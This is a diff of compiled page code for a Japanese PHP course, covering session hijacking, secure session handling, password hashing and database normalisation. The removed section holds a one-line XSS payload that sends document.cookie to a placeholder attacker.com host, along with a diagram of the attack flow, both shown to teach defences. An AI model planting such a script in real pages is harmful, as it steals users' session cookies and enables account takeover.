24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M9 3v2m6-2v2M9 19v2m6-2v2M5 9H3m2 6H3m18-6h-2m2 6h-2M7 19h10a2 2 0 002-2V7a2 2 0 00-2-2H7a2 2 0 00-2 2v10a2 2 0 002 2zM9 9h6v6H9V9z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"3. セッション予測攻撃"}),e.jsx("div",{className:"text-sm text-slate-600",children:"セッションIDの生成パターンを解析して推測"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-red-50 rounded border border-red-200",children:[e.jsx("div",{className:"w-6 h-6 text-red-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"4. セッション固定攻撃"}),e.jsx("div",{className:"text-sm text-slate-600",children:"攻撃者が事前に用意したセッションIDを被害者に使わせる"})]})]})]})})]}),`
-`,e.jsxs(n,{summary:"XSS攻撃によるセッション盗取例",children:[e.jsx(s.p,{children:e.jsx(s.strong,{children:"攻撃例：悪意のあるJavaScript"})}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-javascript",children:`// 攻撃者が仕込む悪意のあるスクリプト
-document.location = 'http://attacker.com/steal.php?cookie=' + document.cookie;
-`})}),e.jsx(s.p,{children:"このスクリプトが実行されると、ユーザーのCookie（セッションIDを含む）が攻撃者のサーバーに送信されます。"}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"攻撃の流れ："})}),e.jsx(i,{children:`
-graph TD
-  A[攻撃者がXSSスクリプトを仕込む] --> B[ユーザーが該当ページにアクセス]
-  B --> C[悪意のあるスクリプトが実行]
-  C --> D[CookieデータGET]
-  D --> E[攻撃者のサーバーにデータ送信]
-  E --> F[攻撃者がセッションIDを取得]
-  F --> G[なりすましアクセス成功]
-  
-  style A fill:#fef2f2
-  style G fill:#fef2f2
-`})]}),`
-`,e.jsxs(n,{summary:"セキュリティ対策の実装",children:[e.jsx(s.p,{children:e.jsx(s.strong,{children:"基本的なセキュリティ設定："})}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-php",children:`<?php
-// セキュアなセッション設定
-ini_set('session.cookie_httponly', 1);    // XSS対策
-ini_set('session.cookie_secure', 1);      // HTTPS必須（本番環境）
-ini_set('session.cookie_samesite', 'Strict'); // CSRF対策
-ini_set('session.use_strict_mode', 1);    // セッション固定攻撃対策
-
-session_start();
-?>
-`})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"高度なセッション検証関数："})}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-php",children:`<?php
-// funcs.php に追加
-function validateSession() {
-    // IPアドレス検証
-    if (isset($_SESSION['ip_address']) && $_SESSION['ip_address'] !== $_SERVER['REMOTE_ADDR']) {
-        session_destroy();
-        return false;
-    }
-    
-    // User-Agent検証
-    if (isset($_SESSION['user_agent']) && $_SESSION['user_agent'] !== $_SERVER['HTTP_USER_AGENT']) {
-        session_destroy();
-        return false;
-    }
-    
-    // タイムアウト検証（30分）
-    if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > 1800)) {
-        session_destroy();
-        return false;
-    }
-    
-    // 最終アクセス時刻を更新
-    $_SESSION['last_activity'] = time();
-    return true;
-}
-
-// 改良版セッションチェック関数
-function sschk() {
-    if (!isset($_SESSION['chk_ssid']) || $_SESSION['chk_ssid'] != session_id()) {
-        exit('LOGIN ERROR');
-    }
-    
-    // 追加のセキュリティ検証
-    if (!validateSession()) {
-        redirect('login.php');
-    }
-    
-    // セッションIDを再生成
-    session_regenerate_id(true);
-    $_SESSION['chk_ssid'] = session_id();
-}
-?>
-`})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"ログイン時にセキュリティ情報を記録："})}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-php",children:`<?php
-// login_act.php での認証成功時に追加
-if ($val['id'] != "") {
-    // 既存のセッション設定
-    $_SESSION['chk_ssid']  = session_id();
-    $_SESSION['kanri_flg'] = $val['kanri_flg'];
-    $_SESSION['name']      = $val['name'];
-    $_SESSION['user_id']   = $val['id'];
-    
-    // セキュリティ情報を記録
-    $_SESSION['ip_address'] = $_SERVER['REMOTE_ADDR'];
-    $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
-    $_SESSION['login_time'] = time();
-    $_SESSION['last_activity'] = time();
-    
-    session_regenerate_id(true);
-    $_SESSION['chk_ssid'] = session_id();
-    
-    redirect('select.php');
-}
-?>
-`})}),e.jsxs(r,{type:"success",title:"多層防御の重要性",children:[e.jsx(s.p,{children:"セキュリティは複数の対策を組み合わせることが重要です："}),e.jsxs(s.ol,{children:[`
-`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"HttpOnly"}),": JavaScriptからのアクセスを防ぐ"]}),`
-`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"Secure"}),": HTTPS通信でのみ送信"]}),`
-`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"SameSite"}),": CSRF攻撃を防ぐ"]}),`
-`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"セッション検証"}),": IPアドレス・User-Agent確認"]}),`
-`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"タイムアウト"}),": 一定時間後に自動ログアウト"]}),`
 `]})]})]}),`
 `,e.jsx(s.h2,{children:"パスワードハッシュ化"}),`
 `,e.jsxs(n,{summary:"なぜハッシュ化が必要なのか？",children:[e.jsx(s.p,{children:e.jsx(s.strong,{children:"平文パスワードの危険性："})}),e.jsx(r,{type:"danger",title:"絶対にやってはいけないこと",children:e.jsx(s.p,{children:"パスワードを平文（そのまま）でデータベースに保存すること！"})}),e.jsx(l,{children:e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-6",children:[e.jsxs("div",{className:"p-4 bg-red-50 rounded border border-red-200",children:[e.jsxs("div",{className:"flex items-center mb-3",children:[e.jsx("div",{className:"w-6 h-6 text-red-600 mr-2",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 15.5c-.77.833.192 2.5 1.732 2.5z"})})}),e.jsx("div",{className:"font-medium text-red-800",children:"平文パスワードの問題"})]}),e.jsx("div",{className:"text-sm text-red-700",children:e.jsxs(s.p,{children:[e.jsx("strong",{children:"データ漏洩時:"})," パスワードがそのまま露出",e.jsx("br",{}),`
@@ -4807,155 +4744,277 @@ if ($status == false) {
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"ログ記録"}),": 重要な操作はログに記録"]}),`
 `]})})]}),`
 `,e.jsx(s.h2,{children:"まとめ・次のステップ"}),`
-`,e.jsx(n,{summary:"今回学んだこと",children:e.jsx(l,{children:e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-blue-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1721 9z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"セッション管理"}),e.jsx("div",{className:"text-sm text-slate-600",children:"ユーザー状態の保持とHTTPステートレス問題の解決"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-green-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M9 12l2 2 4-4m5.5-1.5a3 3 0 11-6 0 3 3 0 016 0z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"ユーザー認証"}),e.jsx("div",{className:"text-sm text-slate-600",children:"ログイン・ログアウト・権限管理の完全実装"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-orange-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"セキュリティ対策"}),e.jsx("div",{className:"text-sm text-slate-600",children:"セッションハイジャック防止とパスワードハッシュ化"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-purple-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"権限管理"}),e.jsx("div",{className:"text-sm text-slate-600",children:"管理者・一般ユーザーの適切な機能制限"})]})]})]})})})]})}function te(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx(P,{...d})}):P(d)}function u(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const ce=Object.freeze(Object.defineProperty({__proto__:null,default:te},Symbol.toStringTag,{value:"Module"}));function D(d){const s={a:"a",code:"code",h1:"h1",h2:"h2",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...t(),...d.components},{Callout:r,Details:n,Infographic:l,Mermaid:i}=s;return r||g("Callout"),n||g("Details"),l||g("Infographic"),i||g("Mermaid"),e.jsxs(e.Fragment,{children:[e.jsx(s.h1,{children:"#05 PHP - データベース正規化・JOIN・Ajax実装"}),`
+`,e.jsx(n,{summary:"今回学んだこと",children:e.jsx(l,{children:e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-blue-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1721 9z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"セッション管理"}),e.jsx("div",{className:"text-sm text-slate-600",children:"ユーザー状態の保持とHTTPステートレス問題の解決"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-green-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M9 12l2 2 4-4m5.5-1.5a3 3 0 11-6 0 3 3 0 016 0z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"ユーザー認証"}),e.jsx("div",{className:"text-sm text-slate-600",children:"ログイン・ログアウト・権限管理の完全実装"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-orange-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"セキュリティ対策"}),e.jsx("div",{className:"text-sm text-slate-600",children:"パスワードハッシュ化とセッション固定攻撃対策"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-purple-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"権限管理"}),e.jsx("div",{className:"text-sm text-slate-600",children:"管理者・一般ユーザーの適切な機能制限"})]})]})]})})})]})}function te(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx(I,{...d})}):I(d)}function u(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const ce=Object.freeze(Object.defineProperty({__proto__:null,default:te},Symbol.toStringTag,{value:"Module"}));function D(d){const s={a:"a",code:"code",h1:"h1",h2:"h2",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...t(),...d.components},{Callout:r,Details:n,Infographic:l,Mermaid:i}=s;return r||g("Callout"),n||g("Details"),l||g("Infographic"),i||g("Mermaid"),e.jsxs(e.Fragment,{children:[e.jsx(s.h1,{children:"#04 PHP - データベース設計基礎"}),`
 `,e.jsx(n,{summary:"今回のゴール",children:e.jsxs(s.ul,{children:[`
-`,e.jsx(s.li,{children:"データモデリングの基礎を理解し、エンティティとリレーションシップでデータを整理できるようになる"}),`
-`,e.jsx(s.li,{children:"ER図（エンティティ・リレーションシップ図）を読み書きできるようになる"}),`
-`,e.jsx(s.li,{children:"データベース正規化（第1〜第3正規形）の概念を理解し、適切なテーブル設計を身につける"}),`
-`,e.jsx(s.li,{children:"リレーション（1対1、1対多、多対多）を理解し、実際の設計に活用できるようになる"}),`
-`,e.jsx(s.li,{children:"JOINを使って複数テーブルから関連データを取得する技術を習得する"}),`
-`,e.jsx(s.li,{children:"GROUP BYによる集計・分析クエリを書けるようになる"}),`
+`,e.jsx(s.li,{children:"データモデリング、ER図、正規化の基礎を理解し、適切なテーブル設計ができるようになる"}),`
+`,e.jsx(s.li,{children:"INNER JOINを使って、複数テーブルからデータを取得できるようになる"}),`
 `]})}),`
-`,e.jsxs(n,{summary:"授業前準備",children:[e.jsx(r,{type:"tip",title:"毎回の準備作業",children:e.jsx(s.p,{children:"今回はデータベース設計の基礎を学びます。ER図作成ツールの準備も行います。"})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"1. XAMPP起動"})}),e.jsxs(s.ul,{children:[`
-`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"Windows"}),": Apache と MySQL が緑色"]}),`
-`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"Mac"}),': MySQL Database と Apache Web Server が "Running"']}),`
-`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"2. phpMyAdminの確認"})}),e.jsxs(s.ul,{children:[`
-`,e.jsxs(s.li,{children:[e.jsx(s.code,{children:"http://localhost/phpmyadmin/"})," にアクセス"]}),`
-`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"3. VSCode拡張機能のインストール"})}),e.jsxs(s.ul,{children:[`
-`,e.jsx(s.li,{children:"Draw.io Integration をインストール（ER図作成用）"}),`
+`,e.jsxs(r,{type:"note",title:"配布コード",children:[e.jsxs(s.p,{children:["zipファイルをダウンロード後に展開し、XAMPPの",e.jsx(s.code,{children:"htdocs"}),"フォルダに配置してください！"]}),e.jsxs(s.ul,{children:[`
+`,e.jsxs(s.li,{children:["講義内資料: ",e.jsx(s.a,{href:"../../zip/php04.zip",children:"php04.zip"})]}),`
 `]})]}),`
-`,e.jsx(s.h2,{children:"データベース設計・正規化の基礎"}),`
-`,e.jsxs(n,{summary:"なぜ正規化が必要なのか？",children:[e.jsx(r,{type:"info",title:"正規化の本質",children:e.jsxs(s.p,{children:["正規化とは、",e.jsx(s.strong,{children:"データの重複を排除し、データの整合性を保つ"}),"ためのデータベース設計手法です。"]})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"正規化を学ぶ重要性："})}),e.jsx(l,{children:e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-blue-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"データ整合性の確保"}),e.jsx("div",{className:"text-sm text-slate-600",children:"同じ情報が複数箇所で矛盾することを防ぐ"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-green-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M13 10V3L4 14h7v7l9-11h-7z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"保守性の向上"}),e.jsx("div",{className:"text-sm text-slate-600",children:"データ変更時の影響範囲を最小化"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-orange-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M5 12h14M5 12a2 2 0 01-2-2V6a2 2 0 012-2h6l2 2h6a2 2 0 012 2v4a2 2 0 01-2 2H5a2 2 0 01-2-2z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"ストレージ効率"}),e.jsx("div",{className:"text-sm text-slate-600",children:"データ重複を排除し、容量を節約"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-purple-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M7 21a4 4 0 01-4-4V5a2 2 0 012-2h4a2 2 0 012 2v12a4 4 0 01-4 4zM21 5a2 2 0 00-2-2h-4a2 2 0 00-2 2v12a4 4 0 004 4h4a2 2 0 002-2V5z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"柔軟性の確保"}),e.jsx("div",{className:"text-sm text-slate-600",children:"新しい要件への対応が容易"})]})]})]})})]}),`
-`,e.jsxs(n,{summary:"問題のあるテーブル設計例",children:[e.jsx(s.p,{children:e.jsx(s.strong,{children:"シナリオ：プログラミングスクールの学習管理システム"})}),e.jsx(s.p,{children:"生徒がさまざまなコースを受講し、各コースには担当講師がいる状況を考えてみましょう。"}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"問題のある設計（非正規化テーブル）："})}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-sql",children:`-- student_course_bad テーブル（問題のある設計）
-CREATE TABLE student_course_bad (
-    id INT PRIMARY KEY AUTO_INCREMENT,
-    student_name VARCHAR(64),
-    student_email VARCHAR(256),
-    student_phone VARCHAR(32),
-    course_name VARCHAR(64),
-    instructor_name VARCHAR(64),
-    instructor_email VARCHAR(256),
-    course_fee INT,
-    enrollment_date DATE
-);
-`})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"サンプルデータ："})}),e.jsxs(s.table,{children:[e.jsx(s.thead,{children:e.jsxs(s.tr,{children:[e.jsx(s.th,{children:"id"}),e.jsx(s.th,{children:"student_name"}),e.jsx(s.th,{children:"student_email"}),e.jsx(s.th,{children:"student_phone"}),e.jsx(s.th,{children:"course_name"}),e.jsx(s.th,{children:"instructor_name"}),e.jsx(s.th,{children:"instructor_email"}),e.jsx(s.th,{children:"course_fee"}),e.jsx(s.th,{children:"enrollment_date"})]})}),e.jsxs(s.tbody,{children:[e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"1"}),e.jsx(s.td,{children:"田中太郎"}),e.jsx(s.td,{children:e.jsx(s.a,{href:"mailto:tanaka@example.com",children:"tanaka@example.com"})}),e.jsx(s.td,{children:"090-1234-5678"}),e.jsx(s.td,{children:"PHP基礎"}),e.jsx(s.td,{children:"佐藤先生"}),e.jsx(s.td,{children:e.jsx(s.a,{href:"mailto:sato@school.com",children:"sato@school.com"})}),e.jsx(s.td,{children:"50000"}),e.jsx(s.td,{children:"2024-01-15"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"2"}),e.jsx(s.td,{children:"佐藤花子"}),e.jsx(s.td,{children:e.jsx(s.a,{href:"mailto:sato@example.com",children:"sato@example.com"})}),e.jsx(s.td,{children:"080-9876-5432"}),e.jsx(s.td,{children:"JavaScript基礎"}),e.jsx(s.td,{children:"田中先生"}),e.jsx(s.td,{children:e.jsx(s.a,{href:"mailto:tanaka@school.com",children:"tanaka@school.com"})}),e.jsx(s.td,{children:"45000"}),e.jsx(s.td,{children:"2024-01-16"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"3"}),e.jsx(s.td,{children:"田中太郎"}),e.jsx(s.td,{children:e.jsx(s.a,{href:"mailto:tanaka@example.com",children:"tanaka@example.com"})}),e.jsx(s.td,{children:"090-1234-5678"}),e.jsx(s.td,{children:"React応用"}),e.jsx(s.td,{children:"佐藤先生"}),e.jsx(s.td,{children:e.jsx(s.a,{href:"mailto:sato@school.com",children:"sato@school.com"})}),e.jsx(s.td,{children:"60000"}),e.jsx(s.td,{children:"2024-01-17"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"4"}),e.jsx(s.td,{children:"鈴木一郎"}),e.jsx(s.td,{children:e.jsx(s.a,{href:"mailto:suzuki@example.com",children:"suzuki@example.com"})}),e.jsx(s.td,{children:"070-1111-2222"}),e.jsx(s.td,{children:"PHP基礎"}),e.jsx(s.td,{children:"佐藤先生"}),e.jsx(s.td,{children:e.jsx(s.a,{href:"mailto:sato@school.com",children:"sato@school.com"})}),e.jsx(s.td,{children:"50000"}),e.jsx(s.td,{children:"2024-01-18"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"5"}),e.jsx(s.td,{children:"田中太郎"}),e.jsx(s.td,{children:e.jsx(s.a,{href:"mailto:tanaka@example.com",children:"tanaka@example.com"})}),e.jsx(s.td,{children:"090-1234-5678"}),e.jsx(s.td,{children:"JavaScript基礎"}),e.jsx(s.td,{children:"田中先生"}),e.jsx(s.td,{children:e.jsx(s.a,{href:"mailto:tanaka@school.com",children:"tanaka@school.com"})}),e.jsx(s.td,{children:"45000"}),e.jsx(s.td,{children:"2024-01-20"})]})]})]}),e.jsx(r,{type:"warning",title:"このテーブル設計の深刻な問題",children:e.jsx(s.p,{children:"このテーブルは「誰が」「いつ」「どのコースを受講したか」を記録していますが、多くの問題を抱えています。"})})]}),`
-`,e.jsxs(n,{summary:"データベース異常の詳細解説",children:[e.jsx(s.p,{children:"非正規化テーブルが引き起こす4つの異常について詳しく見てみましょう："}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"1. データの重複異常"})}),e.jsx(l,{children:e.jsxs("div",{className:"p-4 bg-red-50 rounded border border-red-200",children:[e.jsxs("div",{className:"flex items-center mb-3",children:[e.jsx("div",{className:"w-6 h-6 text-red-600 mr-2",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 15.5c-.77.833.192 2.5 1.732 2.5z"})})}),e.jsx("div",{className:"font-medium text-red-800",children:"データ重複の問題"})]}),e.jsx("div",{className:"text-sm text-red-700",children:e.jsxs(s.p,{children:[e.jsx("strong",{children:"重複例："}),e.jsx("br",{}),`
-• 田中太郎の学生情報が3回記録`,e.jsx("br",{}),`
-• 佐藤先生の講師情報が3回記録`,e.jsx("br",{}),`
-• PHP基礎コースの情報が2回記録`,e.jsx("br",{}),`
-`,e.jsx("strong",{children:"問題："})," ストレージの無駄遣い、データの非効率性"]})})]})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"2. 更新異常（Update Anomaly）"})}),e.jsx(l,{children:e.jsxs("div",{className:"p-4 bg-orange-50 rounded border border-orange-200",children:[e.jsxs("div",{className:"flex items-center mb-3",children:[e.jsx("div",{className:"w-6 h-6 text-orange-600 mr-2",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"})})}),e.jsx("div",{className:"font-medium text-orange-800",children:"更新時の問題"})]}),e.jsx("div",{className:"text-sm text-orange-700",children:e.jsxs(s.p,{children:[e.jsx("strong",{children:"問題例："}),e.jsx("br",{}),`
-佐藤先生のメールアドレスを変更する場合、3つの行を全て更新する必要がある`,e.jsx("br",{}),`
-`,e.jsx("strong",{children:"リスク："})," 更新し忘れると、同じ先生なのに異なるメールアドレスが記録される（データの不整合）"]})})]})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"3. 挿入異常（Insert Anomaly）"})}),e.jsx(l,{children:e.jsxs("div",{className:"p-4 bg-yellow-50 rounded border border-yellow-200",children:[e.jsxs("div",{className:"flex items-center mb-3",children:[e.jsx("div",{className:"w-6 h-6 text-yellow-600 mr-2",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M12 6v6m0 0v6m0-6h6m-6 0H6"})})}),e.jsx("div",{className:"font-medium text-yellow-800",children:"挿入時の問題"})]}),e.jsx("div",{className:"text-sm text-yellow-700",children:e.jsxs(s.p,{children:[e.jsx("strong",{children:"問題例："}),e.jsx("br",{}),`
-• 新しいコース「Python基礎」を開設したいが、受講生がいない場合、コース情報だけを登録できない`,e.jsx("br",{}),`
-• 新しい講師「山田先生」を雇ったが、担当コースがない場合、講師情報だけを登録できない`,e.jsx("br",{}),`
-`,e.jsx("strong",{children:"問題："})," 関連しないデータも一緒に登録しないといけない"]})})]})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"4. 削除異常（Delete Anomaly）"})}),e.jsx(l,{children:e.jsxs("div",{className:"p-4 bg-purple-50 rounded border border-purple-200",children:[e.jsxs("div",{className:"flex items-center mb-3",children:[e.jsx("div",{className:"w-6 h-6 text-purple-600 mr-2",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"})})}),e.jsx("div",{className:"font-medium text-purple-800",children:"削除時の問題"})]}),e.jsx("div",{className:"text-sm text-purple-700",children:e.jsxs(s.p,{children:[e.jsx("strong",{children:"問題例："}),e.jsx("br",{}),`
